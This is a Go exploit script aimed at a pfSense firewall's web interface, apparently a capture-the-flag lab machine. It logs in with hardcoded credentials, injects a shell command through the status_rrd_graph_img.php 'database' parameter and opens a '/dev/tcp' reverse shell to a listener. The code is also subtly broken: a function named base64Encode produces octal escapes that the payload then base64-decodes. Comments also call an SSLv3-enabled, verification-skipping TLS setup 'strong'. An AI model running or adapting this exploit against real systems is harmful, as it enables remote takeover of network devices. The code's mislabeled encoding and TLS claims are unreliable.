package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// CreateHTTPClient sets up a TLS HTTP client
func CreateHTTPClient() *http.Client {
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionSSL30, // Allow SSLv3 for legacy systems
		MaxVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_RSA_WITH_AES_256_CBC_SHA, // Strong cipher suite
		},
		InsecureSkipVerify: true,
	}
	transport := &http.Transport{TLSClientConfig: tlsConfig}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	return client
}

// Main function
func main() {
	rhost := "10.10.10.60" // Target IP
	lhost := "10.10.16.6"  // Local IP
	lport := "80"          // Local port
	username := "rohit"    // Username
	password := "pfsense"  // Password

	loginURL := fmt.Sprintf("https://%s/index.php", rhost)
	exploitURL := fmt.Sprintf("https://%s/status_rrd_graph_img.php?database=queues;echo+%s|base64+-d|sh", rhost, generateBase64Payload(lhost, lport))

	client := CreateHTTPClient()

	// Step 1: Get CSRF Token
	csrfToken, err := getCSRFToken(client, loginURL)
	if err != nil {
		fmt.Println("Error obtaining CSRF token:", err)
		return
	}
	fmt.Println("CSRF token obtained:", csrfToken)

	// Step 2: Log in
	err = login(client, loginURL, csrfToken, username, password)
	if err != nil {
		fmt.Println("Error logging in:", err)
		return
	}
	fmt.Println("Login successful.")

	// Step 3: Run Exploit
	fmt.Println("Running exploit...")
	fmt.Println("Exploit URL:", exploitURL) // Debugging output for verification
	err = runExploit(client, exploitURL)
	if err != nil {
		fmt.Println("Error running exploit:", err)
	} else {
		fmt.Println("Exploit completed.")
	}
}

// Base64-encoded `/bin/sh` reverse shell payload
func generateBase64Payload(lhost, lport string) string {
	payload := fmt.Sprintf(
		"sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", lhost, lport,
	)
	return base64Encode(payload)
}

// Encode string in Base64
func base64Encode(input string) string {
	var encoded strings.Builder
	for _, char := range input {
		encoded.WriteString(fmt.Sprintf("\\%03o", char))
	}
	return encoded.String()
}

func getCSRFToken(client *http.Client, loginURL string) (string, error) {
	resp, err := client.Get(loginURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := readBody(resp)
	if err != nil {
		return "", err
	}

	re := regexp.MustCompile(`var csrfMagicToken = "(sid:[^"]+)"`)
	matches := re.FindStringSubmatch(body)
	if len(matches) < 2 {
		return "", fmt.Errorf("CSRF token not found")
	}
	return matches[1], nil
}

func login(client *http.Client, loginURL, csrfToken, username, password string) error {
	data := url.Values{}
	data.Set("__csrf_magic", csrfToken)
	data.Set("usernamefld", username)
	data.Set("passwordfld", password)
	data.Set("login", "Login")

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("login failed with status code: %d", resp.StatusCode)
	}
	return nil
}

func runExploit(client *http.Client, exploitURL string) error {
	_, err := client.Get(exploitURL)
	if err != nil {
		if strings.Contains(err.Error(), "Client.Timeout exceeded") {
			return nil // Timeout is expected if reverse shell is successful
		}
		return err
	}
	return nil
}

func readBody(resp *http.Response) (string, error) {
	buf := new(bytes.Buffer) // Use bytes.Buffer instead of strings.Builder
	_, err := buf.ReadFrom(resp.Body)
	if err != nil {
		return "", err
	}
	return buf.String(), nil
}
